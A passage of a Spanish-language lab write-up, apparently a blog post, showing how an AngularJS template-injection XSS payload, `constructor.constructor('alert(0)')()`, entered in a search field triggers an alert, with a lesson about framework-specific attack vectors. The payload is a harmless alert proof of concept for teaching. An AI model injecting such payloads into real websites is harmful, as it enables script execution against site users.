Ante este tipo de escenarios, podemos recurrir a [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md) para buscar vectores de ataque espec√≠ficos. En este caso encontramos un payload que puede funcionar: `constructor.constructor('alert(0)')()` 

Si lo introducimos en el campo de b√∫squeda y damos a `search`, veremos que se ejecuta el alert, confirmando la vulnerabilidad.


<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

El prop√≥sito de este laboratorio es entender que, aunque muchas de las pruebas habituales para inyecciones XSS no funcionen, siempre puede darse el caso de que la aplicaci√≥n est√© utilizando tecnolog√≠as o frameworks concretos (como **AngularJS** en este caso).  

Esto nos muestra la importancia de considerar escenarios m√°s espec√≠ficos, ya que mirar √∫nicamente los vectores cl√°sicos puede hacer que pasemos por alto vulnerabilidades cr√≠ticas.

